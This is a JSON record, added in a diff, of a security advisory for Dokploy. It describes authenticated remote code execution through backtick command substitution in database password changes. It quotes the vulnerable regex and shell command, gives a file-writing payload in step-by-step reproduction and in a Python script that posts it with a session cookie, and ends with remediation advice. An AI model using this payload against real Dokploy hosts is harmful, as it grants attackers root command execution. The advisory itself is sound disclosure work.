@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-9932-qg8x-pr32",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "description": "## Summary\r\n**Dokploy v0.29.1** and potentially earlier versions are vulnerable to **Remote Code Execution (RCE)** when an authenticated user updates the password of a database service (MySQL, PostgreSQL, MariaDB, MongoDB, or Redis). The vulnerability exists because the database password validation regex fails to block the backtick (`` ` ``) character, which is used for command substitution in the server's shell environment. Since Dokploy executes database management commands using string interpolation within a double-quoted Bash string, an attacker can execute arbitrary OS commands on the host system with the privileges of the Dokploy process (typically root).\r\n\r\n---\r\n\r\n## Technical Analysis\r\n\r\n### 1. Vulnerable Regex (Input Validation Bypass)\r\nIn `packages/server/src/db/schema/utils.ts`, the `DATABASE_PASSWORD_REGEX` explicitly allows the backtick (`` ` ``), redirection symbols (`>`, `<`), and semicolons (`;`), which are critical shell metacharacters.\r\n\r\n* **Vulnerable Code:**\r\n    ```typescript\r\n    export const DATABASE_PASSWORD_REGEX = /^[a-zA-Z0-9@#%^&*()_+\\-=[\\]{}|;:,.<>?~`]*$/;\r\n    ```\r\n    *While it blocks forward slashes (`/`) and spaces, attackers can still construct effective payloads using backticks for **Command Substitution**.*\r\n\r\n### 2. Vulnerable Command Construction (Command Injection)\r\nIn the database routers (e.g., `apps/dokploy/server/api/routers/mysql.ts`), the password is used in a shell command string via interpolation.\r\n\r\n* **Vulnerable Implementation:**\r\n    ```typescript\r\n    const command = `\r\n      CONTAINER_ID=$(${containerCmd})\r\n      docker exec \"$CONTAINER_ID\" mysql -u root -p'${databaseRootPassword}' -e \"ALTER USER '${targetUser}'@'%' IDENTIFIED BY '${password}'; FLUSH PRIVILEGES;\"\r\n    `;\r\n    await execAsync(command, { shell: \"/bin/bash\" });\r\n    ```\r\n    Because the `${password}` is placed inside a double-quoted string (`\"...\"`) and executed via `/bin/bash`, any command wrapped in backticks (`` `...` ``) is executed as a subcommand on the host machine before the main command is finalized.\r\n\r\n---\r\n\r\n## Proof of Concept (PoC)\r\n\r\n### Manual Reproduction Steps\r\n1. Log in to the Dokploy dashboard as an authenticated user.\r\n2. Navigate to **Databases** and create a MySQL service.\r\n3. Go to the **Internal Credentials** section of the database.\r\n4. Click the **Update Password** icon for the user or root password.\r\n5. Input the following payload as the new password:\r\n   * **Payload:** `` `id>pwned2.txt``` (This passes the regex because it contains no spaces or slashes).\r\n<img width=\"1200\" height=\"722\" alt=\"image\" src=\"https://github.com/user-attachments/assets/e916df75-047b-4108-a50e-db7b7e9c6748\" />\r\n\r\n6. Click **Update**.\r\n7. Check the Dokploy application directory on the host server. A file named `pwned.txt` will be created containing the output of the `id` command.\r\n<img width=\"551\" height=\"235\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bca63145-fd57-48f8-a69d-270470b089ff\" />\r\n\r\n\r\n### Python Automation Script\r\n```python\r\nimport requests\r\n\r\n# Target Configuration\r\nBASE_URL = \"http://localhost:3000\"\r\nSESSION_TOKEN = \"YOUR_SESSION_TOKEN_HERE\" # From 'better-auth.session_token' cookie\r\nMYSQL_ID = \"YOUR_MYSQL_ID_HERE\"           # Found in the URL\r\n\r\n# Payload: id > pwned.txt (using backticks for substitution)\r\nMALICIOUS_PW = \"`id>pwned.txt`\"\r\n\r\ndef exploit():\r\n    url = f\"{BASE_URL}/api/trpc/mysql.changePassword?batch=1\"\r\n    headers = {\"Cookie\": f\"better-auth.session_token={SESSION_TOKEN}\"}\r\n    data = [{\r\n        \"json\": {\r\n            \"mysqlId\": MYSQL_ID,\r\n            \"password\": MALICIOUS_PW,\r\n            \"type\": \"user\"\r\n        }\r\n    }]\r\n\r\n    response = requests.post(url, json=data, headers=headers)\r\n    if response.status_code == 200:\r\n        print(\"[+] Exploit sent successfully. Check the server for 'pwned.txt'.\")\r\n    else:\r\n        print(f\"[-] Failed with status code: {response.status_code}\")\r\n\r\nif __name__ == \"__main__\":\r\n    exploit()\r\nSuggested Remediation\r\n1. Tighter Input Validation\r\nUpdate the DATABASE_PASSWORD_REGEX in packages/server/src/db/schema/utils.ts to strictly disallow all shell metacharacters.\r\n\r\nTypeScript\r\n// Proposed Safe Regex (Alphanumeric and limited symbols only)\r\nexport const DATABASE_PASSWORD_REGEX = /^[a-zA-Z0-9@#%^&*()_+\\-=[\\]{}:,.]+$/;\r\n2. Switch to Argument-Based Execution\r\nAvoid string interpolation for shell commands. Use execFile or spawn to pass arguments as an array, which prevents the shell from interpreting the password string as code.\r\n\r\nTypeScript\r\n// Example of safer execution\r\nawait execFileAsync(\"docker\", [\r\n    \"exec\",\r\n    containerId,\r\n    \"mysql\",\r\n    \"-u\", \"root\",\r\n    \"-p\" + rootPw,\r\n    \"-e\", `ALTER USER '${targetUser}'@'%' IDENTIFIED BY '${password}';`\r\n]);",
+    "ghsa_id": "GHSA-9932-qg8x-pr32",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-9932-qg8x-pr32",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-9932-qg8x-pr32"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:42Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated RCE via Database Password Command Substitution",
+    "updated_at": "2026-11-12T08:17:42Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
